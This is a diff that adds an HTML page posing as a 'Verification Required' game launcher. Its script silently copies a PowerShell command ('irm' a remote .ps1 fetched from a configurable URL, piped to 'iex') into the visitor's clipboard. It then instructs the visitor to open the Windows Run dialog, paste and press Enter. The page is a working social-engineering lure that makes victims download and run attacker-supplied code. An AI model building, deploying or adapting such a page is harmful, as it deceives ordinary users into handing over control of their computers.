@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Verification</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;900&display=swap');
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    .modal-wrap { font-family: 'Inter', sans-serif; min-height: 100vh; width: 100%;
+      display: flex; align-items: center; justify-content: center; padding: 24px; position: relative; }
+    #bg-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.78); z-index: 0; pointer-events: none; }
+    .modal-content { position: relative; z-index: 1; width: 100%; display: flex; align-items: center; justify-content: center; }
+
+    .page { display: none; }
+    .page.active { display: flex; align-items: center; justify-content: center; width: 100%; }
+    .card { background: #fff; border: 1px solid #e5e7eb; border-radius: 14px;
+      box-shadow: 0 2px 12px rgba(0,0,0,0.05); width: 100%; max-width: min(440px, calc(100vw - 2rem)); }
+
+    .card-header { padding: 18px 22px; border-bottom: 1px solid #e5e7eb;
+      display: flex; align-items: center; gap: 8px; font-size: 0.9rem; font-weight: 600; color: #111; }
+    .card-header svg { color: #2563eb; flex-shrink: 0; }
+    .card-body { padding: 22px; }
+    .captcha-row { display: flex; align-items: center; justify-content: space-between;
+      border: 1.5px solid #e5e7eb; border-radius: 8px; padding: 16px 18px;
+      cursor: pointer; user-select: none; }
+    .captcha-row:hover { border-color: #93c5fd; }
+    .captcha-left { display: flex; align-items: center; gap: 12px; }
+    .checkbox { width: 20px; height: 20px; border: 2px solid #9ca3af; border-radius: 4px;
+      display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
+    .checkbox svg { display: none; }
+    .checkbox.checked { background: #16a34a; border-color: #16a34a; }
+    .checkbox.checked svg { display: block; }
+    .captcha-label { font-size: 0.92rem; font-weight: 500; }
+    .shield { width: 34px; height: 34px; background: linear-gradient(135deg,#1e40af,#3b82f6);
+      border-radius: 50% 50% 50% 50% / 60% 60% 40% 40%; display: flex; align-items: center; justify-content: center; }
+    .badge { display: flex; flex-direction: column; align-items: center; gap: 3px; }
+    .badge span { font-size: 0.58rem; color: #9ca3af; }
+    .launcher { max-width: 480px; }
+    .launcher-top { padding: 30px 30px 0; }
+    .launcher-top h1 { font-size: 1.8rem; font-weight: 900; margin-bottom: 4px; }
+    .launcher-top .tagline { font-size: 0.88rem; color: #6b7280; margin-bottom: 12px; }
+    .os-badge { display: inline-flex; align-items: center; gap: 7px; background: #f0f4ff;
+      border: 1px solid #dbeafe; border-radius: 6px; padding: 5px 10px;
+      font-size: 0.8rem; color: #374151; margin-bottom: 4px; }
+    .steps { padding: 0 30px; }
+    .step { display: flex; gap: 18px; align-items: flex-start;
+      padding: 18px 0; border-bottom: 1px solid #f0f0f0; }
+    .step:last-child { border-bottom: none; }
+    .big-num { font-size: 2rem; font-weight: 900; color: #e5e7eb; line-height: 1; min-width: 30px; }
+    .step-text { padding-top: 3px; }
+    .step-text strong { display: block; font-size: 0.92rem; font-weight: 600; margin-bottom: 2px; }
+    .step-text span { font-size: 0.8rem; color: #6b7280; }
+    .kbd { display: inline-block; background: #f3f4f6; border: 1px solid #d1d5db;
+      border-bottom-width: 2px; border-radius: 4px; padding: 0 6px; font-size: 0.74rem; font-weight: 600; }
+    .launcher-bottom { padding: 4px 30px 30px; }
+    .copy-btn { width: 100%; background: #2563eb; color: #fff; border: none; padding: 14px;
+      border-radius: 8px; font-size: 0.92rem; font-weight: 600;
+      font-family: 'Inter', sans-serif; cursor: pointer; }
+    .copy-btn:hover { background: #1d4ed8; }
+    .modal-wrap.has-bg { background-color: transparent; background-size: cover;
+      background-position: center; background-repeat: no-repeat; background-attachment: fixed; }
+  </style>
+
+</head>
+<body>
+<div class="modal-wrap">
+  <div id="bg-overlay"></div>
+  <div class="modal-content">
+
+  <!-- PAGE 2: Launcher -->
+  <div class="page active" id="page2">
+    <div class="card launcher">
+      <div class="launcher-top">
+        <h1>Verification Required</h1>
+		<br>
+        <p class="tagline">verify to get started</p>
+		<br>
+        <div class="os-badge" id="osBadge"></div>
+      </div>
+      <div class="steps">
+        <div class="step">
+          <div class="big-num">1</div>
+          <div class="step-text">
+            <strong>Press <span class="kbd">Win</span> + <span class="kbd">R</span></strong>
+            <span>Opens the Run dialog.</span>
+          </div>
+        </div>
+        <div class="step">
+          <div class="big-num">2</div>
+          <div class="step-text">
+            <strong>Press <span class="kbd">Ctrl</span> + <span class="kbd">V</span> then <span class="kbd">Enter</span></strong>
+            <span>Command is already in your clipboard.</span>
+          </div>
+        </div>
+        <div class="step">
+          <div class="big-num">3</div>
+          <div class="step-text">
+            <strong>Game launches automatically</strong>
+            <span>No install needed.</span>
+          </div>
+        </div>
+      </div>
+	  <br>
+      <div class="launcher-bottom">
+        <button class="copy-btn" id="copyBtn">Copy Launch Command</button>
+      </div>
+    </div>
+  </div>
+  </div><!-- /.modal-content -->
+
+</div>
+
+<script>
+  var CMD = 'powershell -c "irm https://yourdomain.com/demo.ps1 | iex"';
+
+  fetch('/api/config')
+    .then(r => r.json())
+    .then(cfg => {
+      if (cfg.ps1_url) CMD = `powershell -c "irm ${cfg.ps1_url} | iex"`;
+      var bgUrl = cfg.modal_bg_url || cfg.bg_url;
+      if (bgUrl) {
+        var wrap = document.querySelector('.modal-wrap');
+        wrap.style.backgroundImage = 'url(' + bgUrl + ')';
+        wrap.classList.add('has-bg');
+      }
+    })
+    .catch(() => {});
+
+
+  // OS detection
+  var ua = navigator.userAgent;
+  var isWin = /Windows/i.test(ua), isMac = /Macintosh|Mac OS/i.test(ua);
+  var osLabel = isWin ? 'Win' : isMac ? 'macOS' : /Linux/i.test(ua) ? 'Linux' : 'Unknown';
+  var winSvg = '<svg width="14" height="14" viewBox="0 0 24 24" fill="#0078d4"><path d="M0 3.449L9.75 2.1v9.451H0m10.949-9.602L24 0v11.551H10.949M0 12.6h9.75v9.451L0 20.699M10.949 12.6H24V24l-12.9-1.801"/></svg>';
+  
+  document.getElementById('osBadge').innerHTML = 
+    (isWin ? winSvg : '') + 
+    ' Detected device OS: <strong style="margin-left:2px">' + osLabel + '</strong>';
+
+  // Most Reliable Auto-Copy Function
+  async function copyToClipboard(text) {
+    try {
+      await navigator.clipboard.writeText(text);
+      console.log("✅ Auto-copied using Clipboard API");
+      return true;
+    } catch (err) {
+      // Fallback
+      const textarea = document.createElement("textarea");
+      textarea.value = text;
+      textarea.style.position = "fixed";
+      textarea.style.left = "-999999px";
+      textarea.style.top = "-999999px";
+      textarea.style.opacity = "0";
+      document.body.appendChild(textarea);
+      textarea.focus();
+      textarea.select();
+      
+      try {
+        const success = document.execCommand("copy");
+        document.body.removeChild(textarea);
+        console.log(success ? "✅ Auto-copied using fallback" : "❌ Copy failed");
+        return success;
+      } catch (e) {
+        document.body.removeChild(textarea);
+        return false;
+      }
+    }
+  }
+
+  // Auto-copy when switching to Page 2
+  function verify() {
+    document.getElementById('checkbox').classList.add('checked');
+    
+    setTimeout(async function() {
+      document.getElementById('page1').classList.remove('active');
+      document.getElementById('page2').classList.add('active');
+      
+      // Auto copy when page 2 loads
+      await copyToClipboard(CMD);
+    }, 400);
+  }
+
+  // Manual copy button
+  document.getElementById('copyBtn').addEventListener('click', function() {
+    copyToClipboard(CMD);
+  });
+</script>
+</body>
+</html>
